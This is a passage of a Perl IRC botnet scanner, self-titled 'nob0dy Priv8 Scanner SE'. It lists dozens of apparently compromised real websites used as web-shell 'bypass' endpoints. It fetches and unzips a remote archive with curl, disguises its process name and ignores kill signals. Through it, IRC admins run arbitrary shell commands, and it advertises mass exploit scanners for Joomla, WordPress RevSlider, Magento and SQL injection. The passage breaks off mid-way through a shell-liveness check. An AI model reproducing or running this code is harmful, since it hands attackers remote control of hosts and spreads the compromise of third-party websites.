my @randombarner17  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner18  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner19  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner20  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");





my $full     = $randombarner[rand(scalar(@randombarner))];



my $full1    = $randombarner[rand(scalar(@randombarner))];

my $full2    = $randombarner[rand(scalar(@randombarner))];

my $full3    = $randombarner[rand(scalar(@randombarner))];

my $full4    = $randombarner[rand(scalar(@randombarner))];

my $full5    = $randombarner[rand(scalar(@randombarner))];



my $full6    = $randombarner[rand(scalar(@randombarner))];

my $full7    = $randombarner[rand(scalar(@randombarner))];

my $full8    = $randombarner[rand(scalar(@randombarner))];

my $full9    = $randombarner[rand(scalar(@randombarner))];

my $full10   = $randombarner[rand(scalar(@randombarner))];



my $full11   = $randombarner11[rand(scalar(@randombarner11))];

my $full12   = $randombarner12[rand(scalar(@randombarner12))];

my $full13   = $randombarner13[rand(scalar(@randombarner13))];

my $full14   = $randombarner14[rand(scalar(@randombarner14))];

my $full15   = $randombarner15[rand(scalar(@randombarner15))];



my $full16   = $randombarner16[rand(scalar(@randombarner16))];

my $full17   = $randombarner17[rand(scalar(@randombarner17))];

my $full18   = $randombarner18[rand(scalar(@randombarner18))];

my $full19   = $randombarner19[rand(scalar(@randombarner19))];

my $full20   = $randombarner20[rand(scalar(@randombarner20))];



my $full21   = "http://www.pebk.de/joomla/components/com_mailto/error.php";

my $full22   = "http://optim.gim.med.up.pt/components/com_mailto/error.php";

my $full23   = "http://www.bendit.co/backside/media/mailto/error.php";

my $full24   = "http://www.theatresprives.com/errors.php";

my $full25   = "http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php";



my $full26   = "http://www.pebk.de/joomla/components/com_mailto/error.php";

my $full27   = "http://optim.gim.med.up.pt/components/com_mailto/error.php";

my $full28   = "http://www.pebk.de/joomla/components/com_mailto/error.php";

my $full29   = "http://pictoborden.nl/site/media/mailto/error.php";

my $full30   = "http://blahaoffroadteam.hu/errors.php";







my $jack 		= "".$full.$pgfa."";



my $jack1 		= "".$full1.$pgfa."";

my $jack2 		= "".$full2.$pgfa."";

my $jack3 		= "".$full3.$pgfa."";

my $jack4 		= "".$full4.$pgfa."";

my $jack5  		= "".$full5.$pgfa."";



my $jack6   	= "".$full6.$pgfa."";

my $jack7 		= "".$full7.$pgfa."";

my $jack8  		= "".$full8.$pgfa."";

my $jack9 		= "".$full9.$pgfa."";

my $jack10 		= "".$full10.$pgfa."";



my $jack11 		= "".$full11.$pgfa."";

my $jack12 		= "".$full12.$pgfa."";

my $jack13 		= "".$full13.$pgfa."";

my $jack14 		= "".$full14.$pgfa."";

my $jack15 		= "".$full15.$pgfa."";



my $jack16		= "".$full16.$pgfa."";

my $jack17 		= "".$full17.$pgfa."";

my $jack18 		= "".$full18.$pgfa."";

my $jack19 		= "".$full19.$pgfa."";

my $jack20 		= "".$full20.$pgfa."";



my $jack21		= "".$full21.$pgfa."";

my $jack22 		= "".$full22.$pgfa."";

my $jack23		= "".$full23.$pgfa."";

my $jack24 		= "".$full24.$pgfa."";

my $jack25		= "".$full25.$pgfa."";



my $jack26 		= "".$full26.$pgfa."";

my $jack27 		= "".$full27.$pgfa."";

my $jack28		= "".$full28.$pgfa."";

my $jack29		= "".$full29.$pgfa."";

my $jack30 		= "".$full30.$pgfa."";



my @gantengs	= (".$jack1.",".$jack2.",".$jack3.",".$jack4.",".$jack5.",".$jack6.",".$jack7.",".$jack8.",".$jack9.",".$jack10.",".$jack11.",".$jack12.");

my $best 		= $gantengs[rand(scalar(@gantengs))];

 

 

 

if (@ARGV == 7) {

    print "\n[+] nob0dy Priv8 Scanner SE\n".

          "[+] IRC Host    : $ircserver\n".

          "[+] IRC Port    : $ircport\n".

          "[+] Bot Nick    : $nickname\n".

          "[+] Bot Ident   : $ident\n".

          "[+] Channel     : $chan\n".

          "[+] Bot Admin   : $admin\n".

          "[+] Process/PID : $fakeproc - $$\n\n";

}

 

$SIG{'INT'}   = 'IGNORE';

$SIG{'HUP'}   = 'IGNORE';

$SIG{'TERM'}  = 'IGNORE';

$SIG{'CHLD'}  = 'IGNORE';

$SIG{'PS'}    = 'IGNORE';

 

#chdir("/tmp");

chop (my $priper = `curl -O http://www.fickbus.de/wp-content/data/cache.zip;unzip -o cache.zip;rm -fr cache.zip`);

$ircserver = "$ARGV[0]" if $ARGV[0];

$0 = "$fakeproc"."\0" x 16;

my $pid = fork;

exit if $pid;

die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

 

our %irc_servers;

our %DCC;

my $dcc_sel = new IO::Select->new();

$sel_client = IO::Select->new();

 

sub sendraw {

    if ($#_ == '1') {

    my $socket = $_[0];

    print $socket "$_[1]\n";

    } else {

        print $IRC_cur_socket "$_[0]\n";

    }

}

 

sub connector {

    my $mynick = $_[0];

    my $ircserver_con = $_[1];

    my $ircport_con = $_[2];

    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);

    if (defined($IRC_socket)) {

        $IRC_cur_socket = $IRC_socket;

        $IRC_socket->autoflush(1);

        $sel_client->add($IRC_socket);

        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";

        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";

        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;

        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;

        nick("$mynick");

        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");

        sleep 1;

    }

}

 

sub parse {

    my $servarg = shift;

    if ($servarg =~ /^PING \:(.*)/) {

        sendraw("PONG :$1");

    }

    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {

        if (lc($1) eq lc($mynick)) {

            $mynick = $4;

            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;

        }

    }

    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {

        nick("$mynick".int rand(999));

    }

    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {

        $mynick = $2;

        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;

        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";

        sendraw("MODE $mynick +Bxp");

        sendraw("NS id aanK1234");

        sleep(3);

        sendraw("JOIN $chan");

		sendraw("JOIN #l l ");

        sendraw("PRIVMSG $admin : $admin 9[ 15Let's 4GO9 ]");

		sendraw("PRIVMSG $chan :  9[ 15Let's4 GO15 sCan.!9 ]");

    }

}

 

my $line_temp;

while( 1 ) {

    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }

    select(undef, undef, undef, 0.01);

    delete($irc_servers{''}) if (defined($irc_servers{''}));

    my @ready = $sel_client->can_read(0);

    next unless(@ready);

    foreach $fh (@ready) {

        $IRC_cur_socket = $fh;

        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};

        $nread = sysread($fh, $ircmsg, 4096);

        if ($nread == 0) {

            $sel_client->remove($fh);

            $fh->close;

            delete($irc_servers{$fh});

        }

        @lines = split (/\n/, $ircmsg);

        $ircmsg =~ s/\r\n$//;

 

        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {

						my ($nick,$ident,$host,$chan,$msg) = ($1,$2,$3,$4,$5);

						my $engine ="aanK,coi,Prince,kangkung,roin,Keren,Beken,Marlboro,successor,Brewok,Cita-Citata,Depe,JuPe,Ayu-tingting,Siti-badriah,Zaskia-Gotik,Hesty,InuL-darasista,Duo-Racun,Juwita-Bahar,Uut,Tuty-Wibowo,MeLa-Berby,Ria-Amelia,Melinda,Dewinta-Bahar,Lia-Emilia,Ade-Irma,Shinta-n-Jojo,Jenita-Janet,UAE,Myanmar,Argentina,Austria,Australia,Brazil,Canada,Chili,CoMersil,Czech,Germany,Denmark,Spain,Europe,France,Hungary,Indonesia,Israel,India,Info,Iran,Italy,Japan,Korea,Mexico,Malaysia,Network,Netherlands,Organization,Philippines,Polan,Romania,Russian,Thailand,Ukraine,England,USA,Slovenia,Belgium,Bussines,SouthAfrica,Vietnam,Tuvalu,Cocos,Turky,Asia,Serbia,Singapore,Taiwan,Sweden,Pakistan,Norway,Montenegro,Greece,Education,Goverment,Kazakhstan,Afganistan,Albania,Algeria,Angola,Armenia,Azerbaijan,Bahrain,Bangladesh,Belarus,Bhutan,Bolivia,Bosnia,Bulgaria,Brunei,Cambodia,Cameroon,Christmas,CostaRika,Croatia,Cuba,Cyprus,Dominican,Equador,Egypt,Estonia,Finland,Georgia,Ghana,Grenada,Honduras,Hongkong,Iceland,Ireland,Kenya,Kuwait,Laos,Latvia,Liberia,Libyan,Lithuania,Macedonia,Malta,Mongolia,Mozambique,Namibia,Nauru,Nepal,NewZealand,Nigeria,Paraguay,Peru,Portugal,PuertoRico,Qatar,SaintLucia,Samoa,SaudiArabia,Senegal,Slovakia,Srilanka,Swaziland,Tajikistan,Tanzania,Tokelau,Tonga,Tunisia,Uruguay,Uzbekistan,Venezuela,Yemen,Yugoslavia,Zambia,Uganda,Trinidad,Zimbabwe,KonToL,PePek,TeTek,ItiL,Vagina,NenNen,SuSu,BuahDada,PayuDara,Kentot,eMeL,OraL,Klitoris,Masturbasi,Onani,Sperma,AnaL,Puting,Penis,MeMek,GooGLeCA,GooGLeDE,GooGLeUK,GooGLeFR,GooGLeES,GooGLeIT,GooGLeNL,GooGLeBE,GooGLeCH,GooGLeSE,GooGLeDK,GooGLeNO,GooGLeNZ,GooGLeIE,GooGLeBR,GooGLeAR,GooGLeCO,GooGLeCU,GooGLeCL,GooGLeMX,GooGLeAU,GooGLeRU,GooGLeAT,GooGLePL,GooGLeIL,GooGLeTR,GooGLeUA,GooGLeGR,GooGLeJP,GooGLeCN,GooGLeMY,GooGLeTH,GooGLeIN,GooGLeKR,GooGLeRO,GooGLeTW,GooGLeZA,GooGLePT,BingDE,BingUK,BingCA,BingBR,BingFR,BingES,BingIT,BingBE,BingNL,BingPT,BingNO,BingDK,BingSE,BingCH,BingNZ,BingRU,BingJP,BingCN,BingKR,BingMX,BingAR,BingCL,BingAU,AsKCA,AsKDE,AsKIT,AsKFR,AsKES,AsKRU,AsKNL,AsKUK,AsKBR,AsKPL,AsKAU,AsKAT,AsKJP,AsKSE,AsKMX,AsKNO,AsKDK";

            if ($chan eq $mynick) {

			

                if ($msg =~ /^PING (.*)/) {

                    sendraw("NOTICE $nick :PING $1");

                }

                if ($msg =~ /^VERSION/) {

                    sendraw("NOTICE $nick :VERSION mIRC v6.21 Khaled Mardam-Bey");

                }

                if ($msg =~ /^TIME/) {

                    sendraw("NOTICE $nick :TIME ".$datetime."");

                }

                if (&isAdmin($nick) && $msg eq "!die") { &shell("$chan","kill -9 $$"); }

                if (&isAdmin($nick) && $msg eq "!killall") {&shell("$chan","killall -9 perl");}

                if (&isAdmin($nick) && $msg eq "!reset") { sendraw("QUIT :Restarting...");}

                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) { sendraw("JOIN #".$1); }

                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) { sendraw("PART #".$1); }

                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) { sendraw("NICK ".$1);}

                if (&isAdmin($nick) && $msg =~ /^!pid/) { sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$"); }

                if (&isAdmin($nick) && $msg !~ /^!/) {&shell("$nick","$msg"); }

				}

				else {

                if (&isAdmin($nick) && $msg eq "!die") {&shell("$chan","kill -9 $$"); }

                if (&isAdmin($nick) && $msg eq "!killall") {&shell("$chan","killall -9 perl");}

                if (&isAdmin($nick) && $msg eq "!reset") { sendraw("QUIT :Restarting...");}

                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) { sendraw("JOIN #".$1);}

                if (&isAdmin($nick) && $msg eq "!part") { sendraw("PART $chan");}

                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) { sendraw("PART #".$1);}

                if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {&shell("$chan","$1"); }

                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {&shell("$chan","$1");}

                if (&isAdmin($nick) && $msg =~ /^!addadmin\ (.+) /) {

                

				if (my $pid = fork) { 

						waitpid($pid, 0); } else { 

								if (fork) { exit; } 

							else {

								$newadmin = $1;

                                    $admin = $newadmin;

							&msg("$chan","12 Admin added to4 $admin ");

                }}}

                ##################################################################### HELP COMMAND

 

                if ($msg=~ /^!help/) {

                    my $helplogo = "9[ 15He4Lp9 ]";

                        $inject = "";

                  if (-e ($update_file)){ $inject = "3Ready!!!"; } else { $inject = "4Lost!!!"; }

				  

                   &msg("$nick","$helplogo 15RevSlider Database Wordpress Scan	:6 $revcmd  [dork]");

				   &msg("$nick","$helplogo 15Contact Mass Scanner			  	:6 $cfxcmd  [dork]");

				   &msg("$nick","$helplogo 15Joomla com_hdflvplayer			 	:6 $hdfcmd  [dork]");

				   &msg("$nick","$helplogo 15Joomla com_Jdownload			 	:6 $jdlcmd  [dork]");

				   &msg("$nick","$helplogo 15Joomla AdsManager				 	:6 $adscmd  [dork]");

				   &msg("$nick","$helplogo 15MagEntot Database Scan			 	:6 $magcmd  [dork]");

				   &msg("$nick","$helplogo 15MAGeXPo Uploader				 	:6 $magscmd [dork]");

				   &msg("$nick","$helplogo 15JCe Scan						 	:6 $jcecmd  [dork]");

				   &msg("$nick","$helplogo 15cckjseblod Joomla Scan			 	:6 $cckjcmd [dork]");

				   &msg("$nick","$helplogo 15Sql Mass Scanner			     	:6 $sqlcmd  [dork]");

				   &msg("$nick","$helplogo 15ZenCart Database Scan			 	:6 $zencmd  [dork]"); 

                   &msg("$nick","$helplogo 15Injector : $inject ");

                   &msg("$nick","$helplogo 15Check Bypass:6 !check");

                }

                if ($msg=~ /^!response/ || $msg=~ /^!id/) {

                        $inject = "";

                        if (-e ($update_file)){ $inject = "3Ready!!!"; } else { $inject = "4Lost!!!"; }

                        &msg("$chan","12Injector : $inject ");

                }

               

                if (&isAdmin($nick) && $msg =~ /^!pid/) {

                    &notice("$nick","6Fake Process/PID : $fakeproc - $$");

                }

                if ($msg=~/^!check/){

                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

                    &msg("$chan","9 Checking 30 Bypass..!! Please Wait!");

                                        my $bystats1 = "";my $bystats2 = "";my $bystats3 = "";my $bystats4 = "";my $bystats5 = "";my $bystats6 = "";my $bystats7 = "";my $bystats8 = "";my $bystats9 = "";my $bystats10 = "";

                                        my $bystats11 = "";my $bystats12 = "";my $bystats13 = "";my $bystats14 = "";my $bystats15 = "";my $bystats16 = "";my $bystats17 = "";my $bystats18 = "";my $bystats19 = "";my $bystats20 = "";

										my $bystats21 = "";my $bystats22 = "";my $bystats23 = "";my $bystats24 = "";my $bystats25 = "";my $bystats26 = "";my $bystats27 = "";my $bystats28 = "";my $bystats29 = "";my $bystats30 = "";

                                        my $cekby1 = &get_content($jack1."aankfm");

                                        if ($cekby1 =~ /aankfm/i){ $bystats1 = "6Up!!!"; } else { $bystats1 = "4lost!!!"; }

                                        my $cekby2 = &get_content($jack2."aankfm");

                                        if ($cekby2 =~ /aankfm/i){ $bystats2 = "6Up!!!"; } else { $bystats2 = "4lost!!!"; }

                                        my $cekby3 = &get_content($jack3."aankfm");

                                        if ($cekby3 =~ /aankfm/i){ $bystats3 = "6Up!!!"; } else { $bystats3 = "4lost!!!"; }

                                        my $cekby4 = &get_content($jack4."aankfm");

                                        if ($cekby4 =~ /aankfm/i){ $bystats4 = "6Up!!!"; } else { $bystats4 = "4lost!!!"; }

                                        my $cekby5 = &get_content($jack5."aankfm");

                                        if ($cekby5 =~ /aankfm/i){ $bystats5 = "6Up!!!"; } else { $bystats5 = "4lost!!!"; }

                                        my $cekby6 = &get_content($jack6."aankfm");

                                        if ($cekby6 =~ /aankfm/i){ $bystats6 = "6Up!!!"; } else { $bystats6 = "4lost!!!"; }

                                        my $cekby7 = &get_content($jack7."aankfm");

                                        if ($cekby7 =~ /aankfm/i){ $bystats7 = "6Up!!!"; } else { $bystats7 = "4lost!!!"; }

                                        my $cekby8 = &get_content($jack8."aankfm");

                                        if ($cekby8 =~ /aankfm/i){ $bystats8 = "6Up!!!"; } else { $bystats8 = "4lost!!!"; }

                                        my $cekby9 = &get_content($jack9."aankfm");

                                        if ($cekby9 =~ /aankfm/i){ $bystats9 = "6Up!!!"; } else { $bystats9 = "4lost!!!"; }

                                        my $cekby10 = &get_content($jack10."aankfm");

                                        if ($cekby10 =~ /aankfm/i){ $bystats10 = "6Up!!!"; } else { $bystats10 = "4lost!!!"; }

                                        my $cekby11 = &get_content($jack11."aankfm");

                                        if ($cekby11 =~ /aankfm/i){ $bystats11 = "6Up!!!"; } else { $bystats11 = "4lost!!!"; }

                                        my $cekby12 = &get_content($jack12."aankfm");

                                        if ($cekby12 =~ /aankfm/i){ $bystats12 = "6Up!!!"; } else { $bystats12 = "4lost!!!"; }

                                        my $cekby13 = &get_content($jack13."aankfm");

                                        if ($cekby13 =~ /aankfm/i){ $bystats13 = "6Up!!!"; } else { $bystats13 = "4lost!!!"; }

                                        my $cekby14 = &get_content($jack14."aankfm");

                                        if ($cekby14 =~ /aankfm/i){ $bystats14 = "6Up!!!"; } else { $bystats14 = "4lost!!!"; }

                                        my $cekby15 = &get_content($jack15."aankfm");

                                        if ($cekby15 =~ /aankfm/i){ $bystats15 = "6Up!!!"; } else { $bystats15 = "4lost!!!"; }

                                        my $cekby16 = &get_content($jack16."aankfm");

                                        if ($cekby16 =~ /aankfm/i){ $bystats16 = "6Up!!!"; } else { $bystats16 = "4lost!!!"; }

                                        my $cekby17 = &get_content($jack17."aankfm");

                                        if ($cekby17 =~ /aankfm/i){ $bystats17 = "6Up!!!"; } else { $bystats17 = "4lost!!!"; }

                                        my $cekby18 = &get_content($jack18."aankfm");

                                        if ($cekby18 =~ /aankfm/i){ $bystats18 = "6Up!!!"; } else { $bystats18 = "4lost!!!"; }

                                        my $cekby19 = &get_content($jack19."aankfm");

                                        if ($cekby19 =~ /aankfm/i){ $bystats19 = "6Up!!!"; } else { $bystats19 = "4lost!!!"; }

                                        my $cekby20 = &get_content($jack20."aankfm");

                                        if ($cekby20 =~ /aankfm/i){ $bystats20 = "6Up!!!"; } else { $bystats20 = "4lost!!!"; }     

										my $cekby21 = &get_content($jack21."aankfm");

										if ($cekby21 =~ /aankfm/i){ $bystats21 = "6Up!!!"; } else { $bystats21 = "4lost!!!"; } 

